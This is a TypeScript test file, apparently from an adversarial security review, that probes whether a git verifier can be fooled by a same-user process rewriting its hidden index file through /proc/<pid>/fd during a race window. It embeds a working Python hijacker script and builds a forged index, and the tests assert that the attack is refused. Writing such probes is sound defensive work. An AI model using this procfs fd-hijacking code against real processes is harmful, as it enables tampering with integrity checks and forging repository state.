/*
RFC-1616 round-29 independent adversarial probes — candidate commit
27daa3805, exported tree.

CX-r29-E — claims-index `/proc/<pid>/fd` interception. The verifier
holds its verifier-owned claims index in an O_TMPFILE fd (CX-129's
"nameless inode" defense). Every spawn re-opens `/dev/fd/<n>` and
byte-re-proves it ONCE — but the child then mmaps the inode during its
own lifetime, several ms after the re-prove. A same-UID sibling can
reach the inode through `/proc/<verifier-pid>/fd/<n>` (verified: open
O_RDWR + pwrite succeeds under kernel.yama.ptrace_scope=1) and land a
forged index image inside the re-prove→child-mmap gap.

Attack shape: keep the inode pristine between spawns (re-prove always
passes), and pwrite a forged DIRC image the instant a `git` child
appears under the verifier — before it mmaps GIT_INDEX_FILE.

RESULT (negative — surface CLOSED): the armed window watch pins
`/proc/self/fd/<n>` by inotify AND an ino+ctimeMs stat-pin folded into
settle() (verifier-git.ts:3528-3547, 3804-3812), so a sibling pwrite
fires `change` inside the window and the verdict refuses:
`repository surface mutated during the judged read (/proc/self/fd/22 +N)`.
40/40 attempts refused per channel, none served forged bytes.
*/

import { execFileSync, spawn, spawnSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import { verifierGit } from "../../../src/utils/verifier-git.ts";

const tmpdirs: string[] = [];
afterEach(() => {
  while (tmpdirs.length > 0) rmSync(tmpdirs.pop()!, { recursive: true, force: true });
});

const git = (root: string, args: string[]) =>
  execFileSync("git", ["-C", root, ...args], { encoding: "utf8" }).trim();

const mkRepo = () => {
  const root = mkdtempSync(path.join(os.tmpdir(), "cx29e-"));
  tmpdirs.push(root);
  execFileSync("git", ["init", "-q", "-b", "main", root]);
  git(root, ["config", "user.email", "t@t"]);
  git(root, ["config", "user.name", "t"]);
  writeFileSync(path.join(root, "f.txt"), "v1\n");
  git(root, ["add", "f.txt"]);
  git(root, ["commit", "-qm", "c1"]);
  return root;
};

const HAS_PY = spawnSync("python3", ["--version"]).status === 0;

/**
 * Same-UID procfs fd-hijack writer: scans /proc/<vpid>/fd for
 * deleted-inode fds whose first 4 bytes are "DIRC", and — while a
 * `git` child lives under <vpid> — pwrites the forged image into the
 * inode. Restores the original bytes when no child is alive so the
 * next spawn's re-prove sees pristine bytes.
 */
const startIndexHijacker = (vpid: number, forgedPath: string, matchVerbs: string[], secs = 120) => {
  const script =
    "import os,sys,time\n" +
    "vpid=sys.argv[1]; forged=open(sys.argv[2],'rb').read(); verbs=sys.argv[3].split(','); end=time.time()+float(sys.argv[4])\n" +
    "orig={}  # (st_dev,st_ino) -> original bytes, captured on first sight\n" +
    "def kids():\n" +
    "    r=0\n" +
    "    try:\n" +
    "        for t in os.listdir('/proc/%s/task'%vpid):\n" +
    "            try:\n" +
    "                for k in open('/proc/%s/task/%s/children'%(vpid,t)).read().split():\n" +
    "                    try:\n" +
    "                        if open('/proc/%s/comm'%k).read().strip()=='git':\n" +
    "                            c=open('/proc/%s/cmdline'%k,'rb').read()\n" +
    "                            if any(v.encode() in c for v in verbs): r+=1\n" +
    "                    except: pass\n" +
    "            except: pass\n" +
    "    except: pass\n" +
    "    return r\n" +
    "while time.time()<end:\n" +
    "    k=kids()\n" +
    "    try: names=os.listdir('/proc/%s/fd'%vpid)\n" +
    "    except: time.sleep(0.00005); continue\n" +
    "    for n in names:\n" +
    "        try:\n" +
    "            if ' (deleted)' not in os.readlink('/proc/%s/fd/%s'%(vpid,n)): continue\n" +
    "        except: continue\n" +
    "        try: f=os.open('/proc/%s/fd/%s'%(vpid,n), os.O_RDWR)\n" +
    "        except: continue\n" +
    "        try:\n" +
    "            st=os.fstat(f)\n" +
    "            if os.pread(f,4,0)!=b'DIRC': continue\n" +
    "            key=(st.st_dev, st.st_ino)\n" +
    "            if key not in orig:\n" +
    "                try: orig[key]=os.pread(f,1<<22,0)\n" +
    "                except: orig[key]=None\n" +
    "            o=orig.get(key)\n" +
    "            if k>0:\n" +
    "                # a git child lives — serve forged bytes to its mmap\n" +
    "                os.pwrite(f, forged, 0)\n" +
    "            elif o is not None and os.pread(f,len(o),0)!=o:\n" +
    "                # no child — restore so the next re-prove stays clean\n" +
    "                os.pwrite(f, o, 0)\n" +
    "                try: os.ftruncate(f, len(o))\n" +
    "                except: pass\n" +
    "        except: pass\n" +
    "        finally:\n" +
    "            try: os.close(f)\n" +
    "            except: pass\n" +
    "    time.sleep(0.00002)\n";
  const child = spawn(
    "python3",
    ["-c", script, String(vpid), forgedPath, matchVerbs.join(","), String(secs)],
    { stdio: "ignore" },
  );
  child.unref();
  return {
    stop: () => {
      try {
        child.kill("SIGKILL");
      } catch {
        /* done */
      }
    },
  };
};

const buildForgedIndex = (root: string): { imgPath: string; phantom: string } => {
  const scratch = mkdtempSync(path.join(os.tmpdir(), "cx29e-idx-"));
  tmpdirs.push(scratch);
  const img = path.join(scratch, "index");
  const phantom = "evil/phantom.txt";
  const blob = execFileSync("git", ["-C", root, "hash-object", "-w", "--stdin"], {
    input: "EVIL-BLOB-CONTENT\n",
    encoding: "utf8",
  }).trim();
  // Seed the scratch index with the real staged set, then add the
  // phantom entry — `git update-index` produces a checksummed image.
  execFileSync("git", ["-C", root, "read-tree", "HEAD"], {
    encoding: "utf8",
    env: { ...process.env, GIT_INDEX_FILE: img },
  });
  execFileSync(
    "git",
    ["-C", root, "update-index", "--add", "--cacheinfo", `100644,${blob},${phantom}`],
    { encoding: "utf8", env: { ...process.env, GIT_INDEX_FILE: img } },
  );
  return { imgPath: img, phantom };
};

describe("CX-r29-E claims-index /proc fd hijack", () => {
  it("forged index bytes inside the re-prove→child-mmap gap forge `ls-files` output", async (ctx) => {
    if (!HAS_PY) return ctx.skip();
    const root = mkRepo();
    const { imgPath, phantom } = buildForgedIndex(root);
    const hijack = startIndexHijacker(process.pid, imgPath, ["ls-files"]);
    let forged = 0;
    let refused = 0;
    let honest = 0;
    try {
      for (let i = 0; i < 40 && forged < 1; i++) {
        const r = await verifierGit(root, ["ls-files"]);
        if (r.exitCode === 0 && r.stdout.includes(phantom)) forged++;
        else if (r.exitCode === -1) refused++;
        else honest++;
        // Fresh preflight per call would be captured inside verifierGit;
        // the hijacker rewrites whatever DIRC fd is held at spawn time.
      }
    } finally {
      hijack.stop();
    }
    console.log(`index-hijack ls-files: forged=${forged} refused=${refused} honest=${honest}`);
    expect(forged).toBe(0);
  });

  it("forged index bytes forge `status --porcelain` staged entries", async (ctx) => {
    if (!HAS_PY) return ctx.skip();
    const root = mkRepo();
    const { imgPath, phantom } = buildForgedIndex(root);
    const hijack = startIndexHijacker(process.pid, imgPath, ["status"]);
    let forged = 0;
    let refused = 0;
    let honest = 0;
    try {
      for (let i = 0; i < 40 && forged < 1; i++) {
        const r = await verifierGit(root, ["status", "--porcelain"]);
        if (r.exitCode === 0 && r.stdout.includes(phantom)) forged++;
        else if (r.exitCode === -1) refused++;
        else honest++;
      }
    } finally {
      hijack.stop();
    }
    console.log(`index-hijack status: forged=${forged} refused=${refused} honest=${honest}`);
    expect(forged).toBe(0);
  });
});
